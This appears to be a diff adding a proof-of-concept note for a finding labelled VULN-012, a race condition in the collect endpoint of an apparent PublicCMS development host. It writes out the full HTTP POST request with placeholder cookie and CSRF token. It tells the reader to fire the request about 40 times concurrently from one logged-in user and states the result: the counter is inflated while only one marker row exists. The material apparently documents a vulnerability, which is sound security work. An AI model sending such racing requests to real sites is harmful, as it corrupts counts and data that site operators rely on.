@@ -1,0 +1,11 @@
+### VULN-012 — redemption race (collect-once) -> counter stuffing
+### Fire K in parallel from ONE logged-in user (repeat this request ~40x concurrently):
+POST /collection/collect HTTP/1.1
+Host: site2.dev.publiccms.com
+Cookie: PUBLICCMS_USER=<racer-id>_<token>
+Content-Type: application/x-www-form-urlencoded
+
+_csrf=<token>&contentId=1
+
+### -> each returns "true"; content.collections increments by >1 (e.g. +7) for a single user,
+###    while cms_user_collection has exactly 1 marker row for that user.
